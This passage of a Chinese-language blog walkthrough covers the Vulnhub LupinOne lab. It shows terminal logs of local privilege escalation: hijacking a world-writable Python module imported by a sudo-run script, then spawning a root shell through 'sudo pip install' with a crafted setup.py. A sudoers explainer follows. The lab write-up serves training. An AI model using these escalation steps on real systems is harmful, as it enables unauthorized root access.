+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>通过 sudo 权限执行 python 文件，将权限提升至 arsene，再通过 sudo 权限执行 pip ，将权限提升至 root 。</p>
+<blockquote>
+<p>Link：<a target="_blank" rel="noopener" href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell">icex64@LupinOne:~$ sudo -l<br>Matching Defaults entries for icex64 on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User icex64 may run the following commands on LupinOne:<br>    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>icex64@LupinOne:~$ ls -l /home/arsene/heist.py<br>-rw-r--r-- 1 arsene arsene 118 Oct  4  2021 /home/arsene/heist.py<br>icex64@LupinOne:~$ cat /home/arsene/heist.py<br>import webbrowser<br><br>print (&quot;Its not yet ready to get in action&quot;)<br><br>webbrowser.open(&quot;https://empirecybersecurity.co.mz&quot;)<br>icex64@LupinOne:~$ find / -name webbrowser.py 2&gt;/dev/null<br>/usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ ls -l /usr/lib/python3.9/webbrowser.py<br>-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;import os\nos.system(&quot;/bin/bash&quot;)&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>Traceback (most recent call last):<br>  File &quot;/home/arsene/heist.py&quot;, line 1, in &lt;module&gt;<br>    import webbrowser<br>  File &quot;/usr/lib/python3.9/webbrowser.py&quot;, line 1<br>    import os\nos.system(&quot;/bin/bash&quot;)<br>SyntaxError: unexpected character after line continuation character<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os\nos.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ echo &#x27;import os&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;os.system(&quot;/bin/bash&quot;)&#x27; &gt;&gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os<br>os.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ sudo /usr/bin/python3.9 /home/arsene/heist.py<br>[sudo] password for icex64: <br>Sorry, try again.<br>[sudo] password for icex64: <br>sudo: 1 incorrect password attempt<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>arsene@LupinOne:/home/icex64$ id<br>uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>arsene@LupinOne:/home/icex64$ sudo -l<br>Matching Defaults entries for arsene on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User arsene may run the following commands on LupinOne:<br>    (root) NOPASSWD: /usr/bin/pip<br>arsene@LupinOne:/home/icex64$ TF=$(mktemp -d)<br>arsene@LupinOne:/home/icex64$ echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py<br>arsene@LupinOne:/home/icex64$ sudo pip install $TF<br>Processing /tmp/tmp.tCNxFRVsTv<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>root.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/root.txt</span><br>3mp!r3&#123;congratulations_you_manage_to_pwn_the_lupin1_box&#125;<br>See you on the next heist.<br><span class="hljs-meta">#</span><span class="bash"> ls /home</span><br>arsene  icex64<br><span class="hljs-meta">#</span><span class="bash"> ls /home/icex64</span>      <br>user.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/icex64/user.txt</span><br>3mp!r3&#123;I_See_That_You_Manage_To_Get_My_Bunny&#125;<br><span class="hljs-meta">#</span><span class="bash"> ls /home/arsene</span><br>heist.py  note.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/arsene/note.txt</span><br>Hi my friend Icex64,<br>Can you please help check if my code is secure to run, I need to use for my next heist.<br>I dont want to anyone else get inside it, because it can compromise my account and find my secret file.<br>Only you have access to my program, because I know that your account is secure.<br>See you on the other side.<br>Arsene Lupin.<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、目录扫描：fuff、wfuzz</p>
+<p>2、文件泄露：rsa 私钥</p>
+<p>3、base58解码、ssh2john、john破解</p>
+<p>4、sudo 提权：python文件、pip</p>
+<h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p><strong>1、sudo 允许一个被批准的用户以其他用户的身份去执行命令：</strong></p>
+<blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/humanhaunt/article/details/120414681">https://blog.csdn.net/humanhaunt/article/details/120414681</a></p>
+</blockquote>
+<p>我们直接略过上边的部分，直接看 <strong>”# User privilege specification”</strong> 用户权限定义部分</p>
+<p>大致可以描述为：<strong>who where whom command</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root    ALL=(ALL:ALL)  ALL<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>root 表示root用户</p>
+</li>
+<li><p>ALL 表示从任何的主机都可以执行，也可以这样192.168.100.0/24</p>
+</li>
+<li><p>(ALL:ALL) 是以谁的身份来执行，ALL:ALL 就表示 root 可以以任何人的身份来执行命令，第一个 ALL 是用户，第二个 ALL 是组</p>
+</li>
+<li><p>ALL 表示任何命令</p>
+</li>
+</ul>
+<p>那么整条规则就是 root 用户可以在任何主机以任何人的身份来执行所有的命令。</p>
+<p>在看下面这个定义：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 允许 wheel 组中的所有人运行所有的命令，这就可以说明把用户加入到 wheel 组就可以使用 sudo 命令</span><br><span class="hljs-meta">%</span><span class="bash">wheel  ALL=(ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 只允许 nick 用户在 192.168.10.0/24 网段上连接主机并且以 root 权限执行 useradd 命令</span><br>nick   192.168.10.0/24=(root)  /usr/sbin/useradd<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> sudoers 配置可以在命令部分附加选项，比如设置执行 sudo 时不需要输入密码</span><br>nick ALL=(ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure>
+<p><strong>/etc/sudoers：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/sudoers</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="hljs-meta">#</span><span class="bash"> directly modifying this file.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">Defaults        env_reset</span><br>Defaults        mail_badpass<br>Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Host <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Cmnd <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br>icex64 ALL=(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>arsene ALL=(root) NOPASSWD: /usr/bin/pip<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="hljs-built_in">command</span></span><br><span class="hljs-meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> See sudoers(5) <span class="hljs-keyword">for</span> more information on <span class="hljs-string">&quot;@include&quot;</span> directives:</span><br><br>@includedir /etc/sudoers.d<br></code></pre></td></tr></table></figure>
+<p><strong>2、pip sudo 提权：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> TF=$(mktemp -d)</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip install <span class="hljs-variable">$TF</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> mktemp: 创建临时文件或者目录，这样的创建方式是安全的。-d: 目录</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span></span><br>/tmp/tmp.D5iHBC0ZvC<br><span class="hljs-meta">#</span><span class="bash"> $()与 `` (反引号)：返回括号中命令的结果</span><br><span class="hljs-meta">#</span><span class="bash"> 在bash中，$()与 ``（反引号）都是用来作命令替换的，执行括号或者反引号中的命令。</span><br><span class="hljs-meta">#</span><span class="bash"> 命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC：3.2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/">
+                        <span class="hidden-mobile">BoredHackerBlog：Social Network</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
